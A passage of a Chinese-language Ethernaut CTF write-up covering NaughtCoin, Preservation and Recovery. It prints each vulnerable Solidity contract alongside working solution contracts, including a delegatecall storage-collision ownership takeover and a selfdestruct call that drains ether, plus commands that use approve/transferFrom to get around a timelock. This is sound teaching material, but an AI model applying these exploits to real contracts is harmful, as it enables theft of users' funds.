<span class="token function">Transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> player<span class="token punctuation">,</span> INITIAL_SUPPLY<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _value<span class="token punctuation">)</span> <span class="token keyword">public</span> override lockTokens <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        super<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>_to<span class="token punctuation">,</span> _value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token keyword">modifier</span> <span class="token function">lockTokens</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> player<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            <span class="token keyword">require</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>timestamp <span class="token operator">></span> timeLock<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            <span class="token keyword">_</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>            <span class="token keyword">_</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>要求代币变为 0 即可。</p><p>ERC20 标准转账代币有两种方式，transfer 以及 transferFrom，但是 transfer 被重写了，所以只能用</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">transferFrom</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token builtin">address</span> to<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token builtin">uint256</span> amount</pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">)</span> <span class="token keyword">public</span> virtual override <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token builtin">address</span> spender <span class="token operator">=</span> <span class="token function">_msgSender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token function">_spendAllowance</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token function">_transfer</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>但是转帐前，需要 approver 授权。</p><p>//secondaddr 是另外一个账户地址<br>secondad='0x02823a3D576A35988a623BB3d7F9e9A6D0ae7674'<br>totalvalue='1000000000000000000000000'<br>// 给自己授权<br>await contract.approve (player,totalvalue)<br>await contract.transferFrom(player,secondaddr,totalvalue)</p><h2 id="preservation"><a class="anchor" href="#preservation">#</a> Preservation</h2><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Preservation</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">// public library contracts</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone1Library<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone2Library<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token builtin">uint256</span> storedTime<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token comment">// Sets the function signature for delegatecall</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token builtin">bytes4</span> <span class="token keyword">constant</span> setTimeSignature <span class="token operator">=</span> <span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"setTime(uint256)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _timeZone1LibraryAddress<span class="token punctuation">,</span> <span class="token builtin">address</span> _timeZone2LibraryAddress<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        timeZone1Library <span class="token operator">=</span> _timeZone1LibraryAddress<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        timeZone2Library <span class="token operator">=</span> _timeZone2LibraryAddress<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token comment">// set the time for timezone 1</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">setFirstTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        timeZone1Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token comment">// set the time for timezone 2</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">setSecondTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        timeZone2Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token comment">// Simple library contract to set the time</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">LibraryContract</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token comment">// stores a timestamp</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token builtin">uint256</span> storedTime<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">setTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _time<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        storedTime <span class="token operator">=</span> _time<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>要求获得合约所有权。</p><p>本题的关键就是 delegatecall 函数，该函数调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）。也就是说</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">setFirstTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        timeZone1Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">function</span> <span class="token function">setSecondTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        timeZone2Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>当这两个函数调用时，他们改变的是 slot0 的变量，而我们要求改变合约的拥有者，即 slot2 处的变量。而这两个合约的变量分布为</p><pre><code>unused       |                timeZone1Library
</code></pre><p>--------------------------------------------------- slot 0<br>12 bytes | 20 bytes</p><pre><code>unused       |                timeZone2Library
</code></pre><p>--------------------------------------------------- slot 1<br>12 bytes | 20 bytes</p><pre><code>unused       |                owner
</code></pre><p>--------------------------------------------------- slot 2<br>12 bytes | 20 bytes</p><pre><code>            storedTime
</code></pre><p>--------------------------------------------------- slot 3<br>32 bytes</p><pre><code>            storedTime
</code></pre><p>--------------------------------------------------- slot 0<br>32 bytes</p><p>所以当我们调用 setFirstTime 函数时，我们调用的是 setTime 函数。因此，我们可以将 timeZone1Library 的地址改为攻击合约的地址，然后在攻击合约中写一个 setime 函数，当执行 imeZone1Library.delegatecall (abi.encodePacked (setTimeSignature, _timeStamp)); 时，就可以调用攻击合约的 setime 函数。</p><p>我们需要注意 owner 占据 slot2 的低 20 个字节即可</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">AttackPreservation</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">// stores a timestamp</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token builtin">address</span> doesNotMatterWhatThisIsOne<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token builtin">address</span> doesNotMatterWhatThisIsTwo<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token builtin">address</span> maliciousIndex<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">setTime</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _time<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        maliciousIndex <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token builtin">uint160</span><span class="token punctuation">(</span>_time<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>部署完成后，执行 await contract.setFirstTime (‘攻击合约’)</p><p>然后再执行 await contract.setFirstTime (‘player’) 就可以了。</p><h2 id="recovery"><a class="anchor" href="#recovery">#</a> Recovery</h2><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Recovery</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">//generate tokens</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">generateToken</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _name<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _initialSupply<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">new</span> <span class="token class-name">SimpleToken</span><span class="token punctuation">(</span>_name<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> _initialSupply<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">SimpleToken</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token builtin">string</span> <span class="token keyword">public</span> name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token comment">// constructor</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _name<span class="token punctuation">,</span> <span class="token builtin">address</span> _creator<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _initialSupply<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        name <span class="token operator">=</span> _name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        balances<span class="token punctuation">[</span>_creator<span class="token punctuation">]</span> <span class="token operator">=</span> _initialSupply<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token comment">// collect ether in return for tokens</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>value <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token comment">// allow transfers of tokens</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> _amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-</span> _amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">=</span> _amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token comment">// clean up after ourselves</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _to<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>_to<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>从合约地址找回丢失的 0.5eth</p><p>Analyse<br>通过自毁函数进行转账</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _to<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>      <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>_to<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>更新 msg.sender 余额</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>     <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> _amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>     balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-</span> _amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>     balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">=</span> _amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>只需找到合约地址实行自毁函数将 eth 转会玩家地址就行。</p><p>寻找地址<br>通过 etherscan 进行查找</p><p>计算得到</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Hack</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">getdd</span><span class="token punctuation">(</span><span class="token builtin">address</span> target<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token builtin">address</span> data <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token builtin">uint160</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token builtin">bytes1</span><span class="token punctuation">(</span><span class="token number">0xd6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">bytes1</span><span class="token punctuation">(</span><span class="token number">0x94</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target<span class="token punctuation">,</span> <span class="token builtin">bytes1</span><span class="token punctuation">(</span><span class="token number">0x01</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">return</span> data<span class="token punctuation">;</span> <span class="token comment">//0x8B7bAdf88cBaE3F8Ed26Df75475133E4972bB606</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>Attack</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">attack</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">payable</span> target<span class="token punctuation">;</span> <span class="token comment">// 合约地址</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">payable</span> myaddr<span class="token punctuation">;</span> <span class="token comment">//player</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _addr<span class="token punctuation">,</span> <span class="token builtin">address</span> <span class="token keyword">payable</span> _myaddr<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        target<span class="token operator">=</span>_addr<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        myaddr<span class="token operator">=</span>_myaddr<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    </pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        target<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"destroy(address)"</span><span class="token punctuation">,</span>myaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>部署后运行 exploit 函数就行。</p><h2 id="magicnumber"><a class="anchor" href="#magicnumber">#</a> MagicNumber</h2><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">MagicNum</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> solver<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">setSolver</span><span class="token punctuation">(</span><span class="token builtin">address</span> _solver<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        solver <span class="token operator">=</span> _solver<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token comment">/*</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    ____________/\\\_______/\\\\\\\\\_____        </pre></td></tr><tr><td data-num="15"></td><td><pre>     __________/\\\\\_____/\\\///////\\\___       </pre></td></tr><tr><td data-num="16"></td><td><pre>      ________/\\\/\\\____\///______\//\\\__      </pre></td></tr><tr><td data-num="17"></td><td><pre>       ______/\\\/\/\\\______________/\\\/___     </pre></td></tr><tr><td data-num="18"></td><td><pre>        ____/\\\/__\/\\\___________/\\\//_____    